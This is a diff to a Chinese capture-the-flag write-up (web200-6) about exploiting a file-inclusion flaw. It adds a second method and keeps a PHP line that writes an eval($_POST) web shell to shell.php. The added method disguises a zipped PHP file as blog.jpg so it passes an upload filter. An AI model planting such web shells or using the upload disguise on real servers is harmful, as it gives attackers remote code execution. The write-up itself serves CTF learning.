@@ -1,4 +1,4 @@
-### web200-6 WriteUp 
+## web200-6 WriteUp 
 
 ---------------  
 
@@ -14,6 +14,7 @@ include.php 存在文件包含漏洞
 [https://segmentfault.com/a/1190000002166235](https://segmentfault.com/a/1190000002166235)
 [http://www.mamicode.com/info-detail-888559.html](http://www.mamicode.com/info-detail-888559.html)
 
+###  方法一
 来新建一个目录,名字为blog,下面放一个index.php,里面是一个写shell的php代码
 ```php
 <?php  file_put_contents('shell.php','<?php eval($_POST[1])?>'); ?>
@@ -41,3 +42,7 @@ if(class_exists('Phar')){
 ```
 就会在跟目录下生成一个shell.php,注意.. 不是upload目录下 
 
+### 方法二 
+
+直接把index.php  zip压缩为 blog.zip ,然后改名字为 blog.jpg,
+上传之后,用同样的方法,也可以getshell 
